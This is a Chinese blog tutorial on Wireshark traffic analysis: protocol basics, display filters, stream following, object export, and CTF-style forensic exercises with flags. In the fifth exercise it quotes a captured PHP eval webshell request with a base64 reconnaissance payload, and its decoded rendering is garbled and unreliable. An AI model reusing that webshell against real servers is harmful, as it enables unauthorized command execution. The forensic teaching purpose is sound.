    <content type="html"><![CDATA[<ul><li>学习文章：<a href="https://www.cnblogs.com/zichliang/p/17477251.html">【保姆级教学】抓包工具Wireshark使用教程 - 始識 - 博客园</a></li><li>参考文章：<a href="https://jiangjiyue.github.io/2024/07/04/dd58c5ed/#Wireshark基本使用">应急响应之Wireshark流量分析 - SafeKiller Zone</a></li></ul><h1 id="计算机网络基础"><a href="#计算机网络基础" class="headerlink" title="计算机网络基础"></a>计算机网络基础</h1><ul><li>这个只是简单的介绍，默认有计算机网络的基础。</li></ul><h2 id="常用协议"><a href="#常用协议" class="headerlink" title="常用协议"></a>常用协议</h2><ul><li><strong>应用层</strong>：<ul><li>HTTP协议：超文本传输协议，最经常使用的协议</li><li>HTTPS协议：密文传输协议，抓包一般会抓到TLS的流量包，这时被加密的数据</li><li>DNS域名解析协议：将域名转化为对应ip</li><li>DHCP协议：自动分配IP地址的协议</li><li>FTP协议：客户端和宿主机文件传输协议</li><li>TFTP协议：简单文件传输协议，一般用于IOT设备，这个协议偏向底层硬件。</li><li>SMTP协议：邮件传输协议，主要就是传输文件</li><li>Telnet协议：远程终端协议，主要是远程登录和远程管理</li><li>Modbus协议：工业控制协议，通用的工业通信协议</li><li>ssh协议：通常用于远程连接</li></ul></li><li><strong>传输层</strong>：<ul><li>TCP协议：</li><li>UDP协议</li></ul></li><li><strong>网络层</strong>：<ul><li>IP协议：</li><li>ICMP协议：</li><li>IGMP协议：</li><li>OSPF协议：</li></ul></li><li><strong>数据链路层</strong>：<ul><li>ARP协议：</li></ul></li></ul><h2 id="协议常见端口"><a href="#协议常见端口" class="headerlink" title="协议常见端口"></a>协议常见端口</h2><ul><li>端口这个概念主要是在传输层和应用层之间通信的一个抽象概念。所以只有在应用层上的协议采用端口这个概念。</li></ul><blockquote><ul><li>HTTP协议：80端口</li><li>HTTPS协议：443端口</li><li>DNS域名解析协议：53端口</li><li>DHCP协议：67、68端口</li><li>FTP协议：20/21端口</li><li>TFTP协议：69端口</li><li>SMTP协议：25端口，SSL加密端口为465端口</li><li>Telnet协议：23端口</li><li><p>Modbus协议：502端口</p></li><li><p>SSH协议：22端口</p></li><li><p>mysql协议或者服务：3306端口</p></li></ul></blockquote><h1 id="wireshark使用"><a href="#wireshark使用" class="headerlink" title="wireshark使用"></a>wireshark使用</h1><ul><li>wireshark是一个底层的抓包软件，还有一些抓包软件：如<code>fiddler</code>、<code>mitmdump</code>这两个抓包软件</li><li><code>wireshark</code>这个软件与<code>burp</code>软件的功能还是差别很大的，<code>burp</code>是专门抓<code>http</code>包的，并且一些功能也是对<code>http</code>包开发的，比如爆破之类的。</li></ul><h2 id="过滤"><a href="#过滤" class="headerlink" title="过滤"></a>过滤</h2><ul><li>由于流量包很多，所以我们在看流量包的时候就必须要使用过滤的命令，从而快速找到相对应的流量包。</li><li><strong>基于IP地址过滤</strong>：<ul><li><strong>筛选源ip为xx的包</strong>：<code>ip.src==xxx.xxx.xxx.xxx</code></li><li><strong>筛选目标ip为xx的包</strong>：<code>ip.dst==xxx.xxx.xxx.xxx</code></li><li><strong>筛选ip为xx的包</strong>：<code>ip.addr==xxx.xxx.xxx.xxx</code></li></ul></li><li><strong>基于MAC地址过滤</strong>：过滤的mac地址书写方法使用<code>windows</code>的mac地址的写法<ul><li><strong>筛选mac地址为xx的包</strong>：<code>eth.src==xx-xx-xx-xx</code></li><li><strong>筛选目标mac为xx的包</strong>：<code>eth.dst=xx-xx-xx-xx</code></li><li><strong>筛选mac为xx的包</strong>：<code>eth.addr=xx-xx-xx-xx</code></li></ul></li><li><p><strong>基于端口号过滤</strong>：端口号用于流量包是从什么应用发出来的，如果端口是通过<code>UDP</code>协议的就将<code>tcp</code>换成<code>udp</code></p><ul><li><strong>过滤源端口为4694的包</strong>：<code>tcp.srcport==4694</code></li><li><strong>过滤tcp端口为4694的包</strong>：<code>tcp.port==4694</code></li><li><strong>过滤目的tcp端口为4694的包</strong>：<code>tcp.dstport==4694</code></li></ul></li><li><p><strong>基于协议过滤</strong>：</p><ul><li><strong>只看arp协议</strong>：<code>arp</code></li><li><strong>只看dhcp</strong>：<code>dhcp</code></li><li><strong>只看https</strong>：<code>https</code></li></ul></li><li><strong>组合过滤</strong>：<ul><li><strong>and组合，dhcp包并且只想看某台电脑的包</strong>：<code>dhcp and eth.src==xx-xx-xx-xx</code></li><li><strong>or组合，dhcp包或者arp包</strong>：<code>dhcp or arp</code></li><li><code>!(非)</code>：不想看某个协议的包</li></ul></li><li><strong>其他过滤</strong>：<ul><li><strong>过滤域名</strong>：<code>http.port==&quot;www.baidu.com&quot;</code>，只看含义<code>www.baidu.com</code>的<code>HTTP</code>流量包</li></ul></li></ul><h2 id="其他实用功能"><a href="#其他实用功能" class="headerlink" title="其他实用功能"></a>其他实用功能</h2><h3 id="记录出现ip-mac-端口"><a href="#记录出现IP、MAC、端口" class="headerlink" title="记录出现IP、MAC、端口"></a>记录出现IP、MAC、端口</h3><ul><li>这个功能可以让我们快速知道这个流量包中到底有多少个<code>IP</code>地址，这样我们就不用一个一个在流量包中翻找。</li><li>这个功能的具体位置如下</li></ul><p><img src="/2025/03/05/%E5%8F%96%E8%AF%81/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E4%B8%8E%E6%BA%AF%E6%BA%90%E5%8F%96%E8%AF%81/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/image-20250308215944815.png" alt="image-20250308215944815"></p><ul><li>打开后我们就可以看到如下界面，这时我们很快就可以确定哪些地址是作为客户端的地址，哪些地址是作为服务器的地址。</li><li>这里如果选择<code>TCP</code>、<code>UDP</code>就可以看到开放的端口</li></ul><p><img src="/2025/03/05/%E5%8F%96%E8%AF%81/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E4%B8%8E%E6%BA%AF%E6%BA%90%E5%8F%96%E8%AF%81/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/image-20250308220042456.png" alt="image-20250308220042456"></p><h3 id="协议分级"><a href="#协议分级" class="headerlink" title="协议分级"></a>协议分级</h3><ul><li>这个功能可以帮助我们统计出各层流量包的占比，我们在进行流量分析的时候可以有一个总体的把握：<ul><li>电脑接收什么协议的流量包，这些流量包的占比</li><li>从流量包中，我们可以初步确定电脑开启了什么服务</li><li>还可以从流量包中可以把握，黑客网络的什么层面进行攻击</li></ul></li></ul><p><img src="/2025/03/05/%E5%8F%96%E8%AF%81/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E4%B8%8E%E6%BA%AF%E6%BA%90%E5%8F%96%E8%AF%81/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/image-20250306201707926.png" alt="image-20250306201707926"></p><ul><li>接下来我们就来详细查看一下这个协议分级的界面，从这里我们就可以从总体上把握黑客攻击的一些情况：<ul><li>出现了<code>MySQL</code>协议，我们就会想到攻击者可能动了数据库，或者攻击者进行了<code>sql</code>注入漏洞的利用</li><li>出现<code>HTTP</code>协议或者<code>HTTPS</code>协议比较多，攻击者可能就是利用网页漏洞进行攻击。</li><li>出现<code>SSH</code>协议就表示电脑可能有被远程连接过，或者尝试远程连接</li><li>出现<code>FTP</code>协议就表示可能有文件进行传输等（HTTPS、HTTP协议也能进行文件传输）</li><li>出现<code>SMTP</code>协议就表面有可能有邮件传输</li><li><strong>所以对应的协议和端口需要记下来，这样做流量分析的时候才能快速反应</strong></li><li>这里出现了分组<strong>分组占比</strong>和<strong>字节占比</strong></li></ul></li></ul><p><img src="/2025/03/05/%E5%8F%96%E8%AF%81/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E4%B8%8E%E6%BA%AF%E6%BA%90%E5%8F%96%E8%AF%81/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/image-20250306202702466.png" alt="image-20250306202702466"></p><p><img src="/2025/03/05/%E5%8F%96%E8%AF%81/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E4%B8%8E%E6%BA%AF%E6%BA%90%E5%8F%96%E8%AF%81/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/image-20250306203454111.png" alt="image-20250306203454111"></p><h3 id="追踪流功能"><a href="#追踪流功能" class="headerlink" title="追踪流功能"></a>追踪流功能</h3><ul><li><code>追踪流</code>的功能只有在对<code>UDP</code>、<code>TCP</code>协议或者更上层的协议分析的时候具有的功能，因为在这层或者这层之上才出现<code>会话</code>和<code>流</code>的概念</li><li>在网络传输中，<strong>网络封装的包</strong>是有大小的限制的<ul><li>所以我们发送一个数据或者是下载一个应用，就需要将这个应用，拆成非常多个流量包，传送到目的主机中才整合起来</li><li>或者我们一个发送的数据包太小，可能会多个数据包整合成一个数据包进行发送。</li><li>对于一个数据分多个包发送，到达目的主机时间不同，我们手动分析的话就比较困难，所以就有了<strong>追踪流</strong>功能</li></ul></li></ul><p><img src="/2025/03/05/%E5%8F%96%E8%AF%81/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E4%B8%8E%E6%BA%AF%E6%BA%90%E5%8F%96%E8%AF%81/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/image-20250306204147716.png" alt="image-20250306204147716"></p><ul><li>使用这个功能后，会打开一个界面，这个界面如下图所示（这是另一个例子）：<ul><li>这里注意，一个完整的数据相当于一个流，比如我们下载了一个<code>zip</code>压缩包，并且我们现在追踪的就是这个流，所以这个流<code>0</code>出现的数据就是整个压缩包的二进制数据，而流<code>1</code>就是其他的数据了</li><li>另存为就会将这整个数据（包括协议的内容）保存到文件中，文件后缀可以自己定义</li><li>这个功能在对分析<strong>攻击者文件上传</strong>或者是<strong>下载的数据</strong>效率非常的高</li><li><strong>注意</strong>：提取下载文件的时候不需要提取整个对话，只要提取发送文件的到目标主机这个对话即可</li><li><strong>注意</strong>：有些时候遇到特殊字符，我们就需要使用<code>16进制</code>来显示数据</li></ul></li></ul><p><img src="/2025/03/05/%E5%8F%96%E8%AF%81/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E4%B8%8E%E6%BA%AF%E6%BA%90%E5%8F%96%E8%AF%81/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/image-20250306205219073.png" alt="image-20250306205219073"></p><p><img src="/2025/03/05/%E5%8F%96%E8%AF%81/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E4%B8%8E%E6%BA%AF%E6%BA%90%E5%8F%96%E8%AF%81/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/image-20250306205710394.png" alt="image-20250306205710394"></p><h3 id="搜索关键字符串"><a href="#搜索关键字符串" class="headerlink" title="搜索关键字符串"></a>搜索关键字符串</h3><ul><li>该功能不会自动显示在<code>wireshark</code>这个界面中，要点击这个放大镜按钮，才会显示，这个功能就相当于搜索</li><li>就输入关键字符串，就会跳转到相应的包中，查看具体内容，有的时候很好用</li></ul><p><img src="/2025/03/05/%E5%8F%96%E8%AF%81/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E4%B8%8E%E6%BA%AF%E6%BA%90%E5%8F%96%E8%AF%81/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/image-20250306210149243.png" alt="image-20250306210149243"></p><ul><li>这里的搜索功能还可以使用其他的搜索语法，其他的搜索语法如下：</li></ul><p><img src="/2025/03/05/%E5%8F%96%E8%AF%81/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E4%B8%8E%E6%BA%AF%E6%BA%90%E5%8F%96%E8%AF%81/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/image-20250306210347267.png" alt="image-20250306210347267"></p><h3 id="导出对象"><a href="#导出对象" class="headerlink" title="导出对象"></a>导出对象</h3><ul><li>使用<code>wireshark</code>这个导出对象的功能会更方便导出一些流量中的网页等。不会像追踪流保持数据保存时会把头数据给保存了。</li><li>功能面板如下的位置如下图所示：</li></ul><p><img src="/2025/03/05/%E5%8F%96%E8%AF%81/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E4%B8%8E%E6%BA%AF%E6%BA%90%E5%8F%96%E8%AF%81/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/image-20250306231709382.png" alt="image-20250306231709382"></p><ul><li>这边我们就来导出一个<code>HTTP</code>协议的数据包内容，查看文件内容发现这个<code>.php</code>文件中的内容是一个<code>base64</code>编码，解码后是一张图片。</li></ul><p><img src="/2025/03/05/%E5%8F%96%E8%AF%81/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E4%B8%8E%E6%BA%AF%E6%BA%90%E5%8F%96%E8%AF%81/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/image-20250306231747660.png" alt="image-20250306231747660"></p><p><img src="/2025/03/05/%E5%8F%96%E8%AF%81/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E4%B8%8E%E6%BA%AF%E6%BA%90%E5%8F%96%E8%AF%81/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/image-20250306231803204.png" alt="image-20250306231803204"></p><p><img src="/2025/03/05/%E5%8F%96%E8%AF%81/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E4%B8%8E%E6%BA%AF%E6%BA%90%E5%8F%96%E8%AF%81/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/image-20250306232341960.png" alt="image-20250306232341960"></p><h3 id="提取流量包"><a href="#提取流量包" class="headerlink" title="提取流量包"></a>提取流量包</h3><ul><li>有的时候一个流量文件中有非常多的流量包，这时我们需要对这个流量文件进行分组，可以按照协议分组也可以按照<code>ip</code>分组，这时我们就可以分组，然后将这些组导出成一个新的流量包，这时我们在这个流量包中就会更方便分析特定的流量包。更有利于分析。</li></ul><h1 id="练习"><a href="#练习" class="headerlink" title="练习"></a>练习</h1><h2 id="题目1_扫描流量检测"><a href="#题目1-扫描流量检测" class="headerlink" title="题目1_扫描流量检测"></a>题目1_扫描流量检测</h2><ul><li>题目描述：</li></ul><blockquote><p>入侵者通过<code>ping</code>工具对局域网内一主机进行存活性扫描,flag 为入侵所发送的<code>16</code>字节的数据包内容。</p></blockquote><ul><li>这里我们要知道<code>ping</code>工具使用的流量包协议为<code>ICMP</code>协议，所以我们打开流量包，只需要过滤出<code>ICMP</code>协议即可。、</li><li>这时就会看到<code>5</code>个<code>ICMP</code>流量包</li></ul><p><img src="/2025/03/05/%E5%8F%96%E8%AF%81/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E4%B8%8E%E6%BA%AF%E6%BA%90%E5%8F%96%E8%AF%81/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/image-20250307171258574.png" alt="image-20250307171258574"></p><ul><li>这时我们查看包中具体发送的内容，看到<code>Data</code>这个字段，就得到发送的数据</li></ul><p><img src="/2025/03/05/%E5%8F%96%E8%AF%81/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E4%B8%8E%E6%BA%AF%E6%BA%90%E5%8F%96%E8%AF%81/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/image-20250307171417345.png" alt="image-20250307171417345"></p><ul><li>所以我们就提取出十六进制数转为字符串即可得到flag</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">2122232425262728292</span>a2b2c2d2e2f30</span><br><span class="line">flag&#123;!<span class="string">&quot;#$%&amp;&#x27;()*+,-./0&#125;</span></span><br></pre></td></tr></table></figure><h2 id="题目2_关键字符提取"><a href="#题目2-关键字符提取" class="headerlink" title="题目2_关键字符提取"></a>题目2_关键字符提取</h2><ul><li>题目描述：</li></ul><blockquote><p>请找到流量包中的<code>flag</code>,格式为:<code>nctf&#123;&#125;</code></p></blockquote><ul><li>先打开流量包，然后直接搜索<code>nctf</code>即可得到对应<code>flag</code></li></ul><p><img src="/2025/03/05/%E5%8F%96%E8%AF%81/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E4%B8%8E%E6%BA%AF%E6%BA%90%E5%8F%96%E8%AF%81/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/image-20250307185018994.png" alt="image-20250307185018994"></p><ul><li><strong>flag</strong>为：</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nctf&#123;wireshark_is_easy&#125;</span><br></pre></td></tr></table></figure><h2 id="题目3_特殊字符提取"><a href="#题目3-特殊字符提取" class="headerlink" title="题目3_特殊字符提取"></a>题目3_特殊字符提取</h2><ul><li>题目描述：</li></ul><blockquote><p>请找到密码,组合为<code>flag</code>,格式为:<code>flag&#123;密码&#125;</code></p></blockquote><ul><li>打开流量包，先查看包的统计情况：发现全是<code>tcp</code>流</li></ul><p><img src="/2025/03/05/%E5%8F%96%E8%AF%81/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E4%B8%8E%E6%BA%AF%E6%BA%90%E5%8F%96%E8%AF%81/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/image-20250307185355314.png" alt="image-20250307185355314"></p><ul><li>这里我们就使用追踪流的功能：发现只有流<code>0</code>，这时我们可以看到流<code>0</code>中有如<code>password</code>，那是否<code>password</code>的值就是<code>backdoor...00Rm8.ate</code>呢？</li></ul><p><img src="/2025/03/05/%E5%8F%96%E8%AF%81/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E4%B8%8E%E6%BA%AF%E6%BA%90%E5%8F%96%E8%AF%81/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/image-20250307185623121.png" alt="image-20250307185623121"></p><ul><li><code>password</code>的值其实并不是<code>backdoor...00Rm8.ate</code>，在<code>wireshark</code>中<code>...</code>可能表示不可显字符串，所以一但字符中出现这个，我们就需要先使用<code>十六进制的形式</code>去查看，然后找到对应的<code>ASCII</code>码。</li></ul><p><img src="/2025/03/05/%E5%8F%96%E8%AF%81/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E4%B8%8E%E6%BA%AF%E6%BA%90%E5%8F%96%E8%AF%81/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/image-20250307185909412.png" alt="image-20250307185909412"></p><ul><li>这时我们看到<code>.</code>实际的十六进制为<code>7f</code>，这时我们就对这<code>ASCII码</code>值发现是<code>DEL</code>字符，表示删除键，所以<code>backdoor...00Rm8.ate</code>这边会被删除掉几个字符，<code>0d</code>就表示回车字符</li></ul><p><img src="/2025/03/05/%E5%8F%96%E8%AF%81/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E4%B8%8E%E6%BA%AF%E6%BA%90%E5%8F%96%E8%AF%81/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/image-20250307190033776.png" alt="image-20250307190033776"></p><p><img src="/2025/03/05/%E5%8F%96%E8%AF%81/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E4%B8%8E%E6%BA%AF%E6%BA%90%E5%8F%96%E8%AF%81/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/image-20250307191552889.png" alt="image-20250307191552889"></p><ul><li>所以<code>密码</code>为：<code>backdoorm8te</code>：</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;backdoorm8te&#125;</span><br></pre></td></tr></table></figure><p><strong>注意</strong>：我们<code>Del</code>键是删除后面的字符串，就像这样</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">abcdefgh</span><br><span class="line">我们使用|代表光标</span><br><span class="line">abcde|fgh</span><br><span class="line">当我们按下一次del键后就会变成</span><br><span class="line">abcde|gh</span><br><span class="line">其实字符流就是</span><br><span class="line"><span class="number">0x61</span> <span class="number">0x62</span> <span class="number">0x63</span> <span class="number">0x64</span> <span class="number">0x65</span> <span class="number">0x7f</span> <span class="number">0x66</span> <span class="number">0x67</span> <span class="number">0x68</span></span><br></pre></td></tr></table></figure><h2 id="题目4_提取压缩包"><a href="#题目4-提取压缩包" class="headerlink" title="题目4_提取压缩包"></a>题目4_提取压缩包</h2><ul><li>题目描述：</li></ul><blockquote><p><code>key</code>为文本格式，你找得到吗？</p></blockquote><ul><li>打开流量包，先查看流量统计，发现只存在<code>TCP</code>协议，但是没有<code>HTTP</code>协议</li></ul><p><img src="/2025/03/05/%E5%8F%96%E8%AF%81/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E4%B8%8E%E6%BA%AF%E6%BA%90%E5%8F%96%E8%AF%81/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/image-20250307192250792.png" alt="image-20250307192250792"></p><ul><li>这时我们就直接追踪流。发现这个流量包中一共有<code>3</code>个流，我们在流<code>1</code>中发现了<code>key: ZipYourMouth</code>，这个很可能是压缩包的密码</li></ul><p><img src="/2025/03/05/%E5%8F%96%E8%AF%81/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E4%B8%8E%E6%BA%AF%E6%BA%90%E5%8F%96%E8%AF%81/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/image-20250307192408365.png" alt="image-20250307192408365"></p><ul><li>接下来我们再查看其他流，我们在流<code>0</code>中看到了这个<code>PK</code>然后一堆乱码，这时我们就会想到<code>zip</code>压缩包的文件头就是<code>PK</code>开头，所以这就相当于一个<code>zip</code>包，并且还有一个<code>flag.txt</code>的文件</li></ul><p><img src="/2025/03/05/%E5%8F%96%E8%AF%81/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E4%B8%8E%E6%BA%AF%E6%BA%90%E5%8F%96%E8%AF%81/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/image-20250307200558929.png" alt="image-20250307200558929"></p><ul><li>之后我们就将这个<code>zip</code>包进行保存，注意<strong>这里是纯TCP流</strong>，并没有应用层的协议，所以使用不了<strong>导出对象</strong>，只能在追踪流那边点击保存，这时我们就选择<code>单向发包</code>的这个，还有一点就是要将这个流显示为原始数据，这样将这个另存为<code>xx.zip</code>的时候，才会存储原始数据</li></ul><p><img src="/2025/03/05/%E5%8F%96%E8%AF%81/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E4%B8%8E%E6%BA%AF%E6%BA%90%E5%8F%96%E8%AF%81/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/image-20250307200524346.png" alt="image-20250307200524346"></p><ul><li>这时我们尝试使用<code>360zip</code>把这个压缩包打开。发现文件没有出错，并且要求输入密码，</li></ul><p><img src="/2025/03/05/%E5%8F%96%E8%AF%81/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E4%B8%8E%E6%BA%AF%E6%BA%90%E5%8F%96%E8%AF%81/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/image-20250307200704076.png" alt="image-20250307200704076"></p><ul><li>这时我们就直接输入密码再解压缩就可以得到对应的flag了</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Flag-qscet5234diQ</span><br></pre></td></tr></table></figure><p><img src="/2025/03/05/%E5%8F%96%E8%AF%81/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E4%B8%8E%E6%BA%AF%E6%BA%90%E5%8F%96%E8%AF%81/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/image-20250307200747817.png" alt="image-20250307200747817"></p><h2 id="题目5_文件提取1"><a href="#题目5-文件提取1" class="headerlink" title="题目5_文件提取1"></a>题目5_文件提取1</h2><ul><li><p>题目描述：无</p></li><li><p>打开这个流量包，发现就<code>4</code>个流，从流<code>0</code>到流<code>3</code>，我们逐个追踪流，发现流<code>1</code>这边执行了类似<code>ls</code>的命令，说明可以远程执行命令，这时已经拿到<code>shell</code>了。</p></li><li>然后我我们看看流<code>0</code>，就会发现用户发给服务器的数据中，可能含有<code>webshell</code></li></ul><p><img src="/2025/03/05/%E5%8F%96%E8%AF%81/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E4%B8%8E%E6%BA%AF%E6%BA%90%E5%8F%96%E8%AF%81/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/image-20250307201221197.png" alt="image-20250307201221197"></p><ul><li>我们还注意到这个程序访问了<code>isg.php</code>，我们看看能不能把这个文件使用<code>导出对象</code>提取出来，发现可以，提取内容如下，与上图的发送数据一致</li></ul><p><img src="/2025/03/05/%E5%8F%96%E8%AF%81/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E4%B8%8E%E6%BA%AF%E6%BA%90%E5%8F%96%E8%AF%81/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/image-20250307202416320.png" alt="image-20250307202416320"></p><ul><li>这时我们就要来分析这个<code>webshell</code>具体执行的是什么，我们将这个<code>webshell</code>使用<code>URL</code>解码可以得到这样：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ISG2014=@eval(base64_decode($_POST[z0]));&amp;z0=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0+fCIpOzskRD1kaXJuYW1lKCRfU0VSVkVSWyJTQ1JJUFRfRklMRU5BTUUiXSk7aWYoJEQ9PSIiKSREPWRpcm5hbWUoJF9TRVJWRVJbIlBBVEhfVFJBTlNMQVRFRCJdKTskUj0ieyREfVx0IjtpZihzdWJzdHIoJEQsMCwxKSE9Ii8iKXtmb3JlYWNoKHJhbmdlKCJBIiwiWiIpIGFzICRMKWlmKGlzX2RpcigieyRMfToiKSkkUi49InskTH06Ijt9JFIuPSJcdCI7JHU9KGZ1bmN0aW9uX2V4aXN0cygncG9zaXhfZ2V0ZWdpZCcpKT9AcG9zaXhfZ2V0cHd1aWQoQHBvc2l4X2dldGV1aWQoKSk6Jyc7JHVzcj0oJHUpPyR1WyduYW1lJ106QGdldF9jdXJyZW50X3VzZXIoKTskUi49cGhwX3VuYW1lKCk7JFIuPSIoeyR1c3J9KSI7cHJpbnQgJFI7O2VjaG8oInw8LSIpO2RpZSgpOw==</span><br></pre></td></tr></table></figure><ul><li>整理可以得到，相当于命令执行</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">eval(base64_decode($_POST[z0]));&amp;</span><br><span class="line">z0=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0+fCIpOzskRD1kaXJuYW1lKCRfU0VSVkVSWyJTQ1JJUFRfRklMRU5BTUUiXSk7aWYoJEQ9PSIiKSREPWRpcm5hbWUoJF9TRVJWRVJbIlBBVEhfVFJBTlNMQVRFRCJdKTskUj0ieyREfVx0IjtpZihzdWJzdHIoJEQsMCwxKSE9Ii8iKXtmb3JlYWNoKHJhbmdlKCJBIiwiWiIpIGFzICRMKWlmKGlzX2RpcigieyRMfToiKSkkUi49InskTH06Ijt9JFIuPSJcdCI7JHU9KGZ1bmN0aW9uX2V4aXN0cygncG9zaXhfZ2V0ZWdpZCcpKT9AcG9zaXhfZ2V0cHd1aWQoQHBvc2l4X2dldGV1aWQoKSk6Jyc7JHVzcj0oJHUpPyR1WyduYW1lJ106QGdldF9jdXJyZW50X3VzZXIoKTskUi49cGhwX3VuYW1lKCk7JFIuPSIoeyR1c3J9KSI7cHJpbnQgJFI7O2VjaG8oInw8LSIpO2RpZSgpOw==</span><br></pre></td></tr></table></figure><ul><li>而<code>z0</code>经过<code>base64</code>解码之后就会出现如下，这个估计就相当于<code>webshell</code>：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">@ini_set(&quot;display_errors&quot;,&quot;0&quot;);</span><br><span class="line">@set_time_limit(0);</span><br><span class="line">@set_magic_quotes_runtime(0);</span><br><span class="line">echo(&quot;-NÎÉY\[YJÔÑTTÈÐÔTÑSSSQHJNÚYOHIY\[YJÔÑTTÈUÕSÓUQJNÉHÉWÚYÝXÝJHOHÈ^ÙÜXXÚ</span><br><span class="line">[ÙJHH\È</span><br><span class="line">ZY\×Ù\ÉNJIHÉNßIHÉOJ[Ý[ÛÙ^\ÝÊÜÜÚ^ÙÙ]YÚYÊJOÐÜÚ^ÙÙ]ÝZY</span><br><span class="line">ÜÚ^ÙÙ]]ZY</span><br><span class="line"></span><br><span class="line">JNÉÎÉ\ÜJJOÉVÉÛ[YI×NÙ]ØÝ\[Ý\Ù\</span><br><span class="line">NÉ\Ý[[YJ</span><br><span class="line">NÉHÉ\ÜJHÜ[ÎÙXÚÊHNÙYJ</span><br><span class="line">NÄ</span><br></pre></td></tr></table></figure><ul><li>然后继续翻找流<code>2</code>，发现是命令执行</li></ul><p><img src="/2025/03/05/%E5%8F%96%E8%AF%81/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E4%B8%8E%E6%BA%AF%E6%BA%90%E5%8F%96%E8%AF%81/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/image-20250307202524428.png" alt="image-20250307202524428"></p><ul><li>之后我们看流<code>3</code>，这时我们发现了一个压缩包</li></ul><p><img 